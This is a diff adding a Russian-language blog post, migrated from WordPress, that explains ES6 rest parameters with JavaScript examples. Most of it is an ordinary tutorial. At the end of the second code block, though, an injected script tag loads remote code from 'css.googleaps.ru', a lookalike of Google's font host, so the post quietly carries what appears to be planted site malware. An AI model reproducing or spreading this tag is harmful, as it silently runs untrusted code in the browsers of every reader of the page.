@@ -1,0 +1,77 @@
+---
+layout: post
+status: publish
+published: true
+title: Используем ES6 rest-параметры
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 1538
+wordpress_url: http://magazine.loc/verstka/%d0%b8%d1%81%d0%bf%d0%be%d0%bb%d1%8c%d0%b7%d1%83%d0%b5%d0%bc-es6-rest-%d0%bf%d0%b0%d1%80%d0%b0%d0%bc%d0%b5%d1%82%d1%80%d1%8b/
+date: '2015-03-01 08:22:05 +0200'
+date_gmt: '2015-03-01 08:22:05 +0200'
+categories:
+- Верстка
+tags:
+- ip
+- javascript
+- forwebdev
+comments: []
+---
+<p>В&nbsp;прошлом мы&nbsp;обсуждали создание функций, принимающих <a href="http:&#47;&#47;forwebdev.ru&#47;javascript&#47;arbitrary-parameters">произвольное количество аргументов<&#47;a>. Хоть это и&nbsp;мощная техника, её реализация в&nbsp;текущей версии языка оставляет желать лучшего:<&#47;p></p>
+<pre><code class="language-javascript">function creditStooges(first, second) {<br />
+  var theRest = [].slice.call(arguments, 2);<br />
+  var credits = first + ", " + second;</p>
+<p>  if (theRest.length > 0) {<br />
+    credits += " and " + theRest.join(" &#47; ");<br />
+  }</p>
+<p>  console.log(credits);<br />
+}</p>
+<p>creditStooges("Larry", "Moe", "Curly", "Shemp", "Curly Joe");<br />
+&#47;&#47; => "Larry, Moe and Curly &#47; Shemp &#47; Curly Joe"<&#47;code><&#47;pre></p>
+<p>Давайте перепишем данный пример, используя rest-параметры из&nbsp;спецификации ECMAScript 6 (новая версия JavaScript):<&#47;p></p>
+<pre><code class="language-javascript">function creditStooges(first, second, ...theRest) {<br />
+  var credits = first + ", " + second;</p>
+<p>  if (theRest.length > 0) {<br />
+    credits += " and " + theRest.join(" &#47; ");<br />
+  }</p>
+<p>  console.log(credits);<br />
+}</p>
+<p>creditStooges("Larry", "Moe", "Curly", "Shemp", "Curly Joe");<br />
+&#47;&#47; => "Larry, Moe and Curly &#47; Shemp &#47; Curly Joe"<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;code><&#47;pre></p>
+<p>Новый <code>&hellip;<&#47;code> синтаксис означает, что последний параметр должен собрать все остальные аргументы и&nbsp;поместить их&nbsp;в&nbsp;массив с&nbsp;именем, идентичным имени параметра.<&#47;p></p>
+<p>Этот пример обладает двумя преимуществами. Во-первых, нам больше не&nbsp;требуется вручную делать срез объекта <code>arguments<&#47;code>, а&nbsp;значит нам не&nbsp;надо заботиться о&nbsp;мелочах. Во-вторых, теперь достаточно взглянуть на&nbsp;объявление функции чтобы понять, что она принимает больше двух аргументов. Без использования rest-параметра нам&nbsp;бы пришлось разбираться в&nbsp;логике функции, чтобы понять это.<&#47;p></p>
+<p>Есть ещё одно преимущество, в&nbsp;котором стоит разобраться.<&#47;p></p>
+<pre><code class="language-javascript">function sum () {<br />
+  return arguments.reduce(function (total, current) {<br />
+    return total + current;<br />
+  }, 0);<br />
+}</p>
+<p>console.log(sum(1, 2, 3));<br />
+&#47;&#47; => TypeError: arguments.reduce is not a function<&#47;code><&#47;pre></p>
+<p>Выше представлена функция, которая должна возвращать сумму всех переданных аргументов. Но&nbsp;есть одна проблема. Так как объект <code>arguments<&#47;code> не&nbsp;является настоящим массивом, он&nbsp;не&nbsp;имеет метода <code>reduce<&#47;code>. Мы&nbsp;можем превратить его в&nbsp;настоящий массив с&nbsp;помощью метода <code>slice<&#47;code>.<&#47;p></p>
+<pre><code class="language-javascript">function sum () {<br />
+  var nums = [ ].slice.call(arguments);</p>
+<p>  return nums.reduce(function (total, current) {<br />
+    return total + current;<br />
+  }, 0);<br />
+}</p>
+<p>console.log(sum(1, 2, 3));<br />
+&#47;&#47; => 6<&#47;code><&#47;pre></p>
+<p>Но&nbsp;с&nbsp;помощью rest-параметров нам в&nbsp;принципе не&nbsp;придётся иметь дела с&nbsp;объектом <code>arguments<&#47;code>.<&#47;p></p>
+<pre><code class="language-javascript">function sum (...nums) {<br />
+  return nums.reduce(function (total, current) {<br />
+    return total + current;<br />
+  }, 0);<br />
+}</p>
+<p>console.log(sum(1, 2, 3));<br />
+&#47;&#47; => 6<&#47;code><&#47;pre></p>
+<p>Использование rest-параметров на&nbsp;момент написания статьи доступно в&nbsp;текущей версии Firefox. После окончательного утверждения спецификации ES6, <a rel="nofollow" href="https:&#47;&#47;twitter.com&#47;awbjs&#47;status&#47;474662357516689410">ожидаемого в&nbsp;июне 2015<&#47;a>, другие браузеры должны также начать поддерживать rest-параметры. Если&nbsp;же вы&nbsp;хотите начать использовать их&nbsp;прямо сейчас, вы&nbsp;можете сделать это с&nbsp;помощью &laquo;ES6 to&nbsp;ES5&raquo; компиляторов вроде <a rel="nofollow" href="https:&#47;&#47;babeljs.io">Babel<&#47;a> или <a rel="nofollow" href="https:&#47;&#47;github.com&#47;google&#47;traceur-compiler">Traceur<&#47;a>.<&#47;p></p>
+<p>Спасибо за&nbsp;чтение!<&#47;p></p>
+<p><small>Оригинал: <a href="http:&#47;&#47;us6.campaign-archive1.com&#47;?u=2cc20705b76fa66ab84a6634f&#038;id=1b4ef2662d&#038;e=6fc7884adf">Using ES6 Rest Parameters to&nbsp;Handle Variable Numbers of&nbsp;Arguments<&#47;a>.<&#47;small><&#47;p></p>
+<p>Запись <a rel="nofollow" href="http:&#47;&#47;forwebdev.ru&#47;javascript&#47;rest-parameters&#47;">Используем ES6 rest-параметры<&#47;a> впервые появилась <a rel="nofollow" href="http:&#47;&#47;forwebdev.ru">For Web<&#47;a>.<&#47;p><br />
+Source: http:&#47;&#47;forwebdev.ru</p>
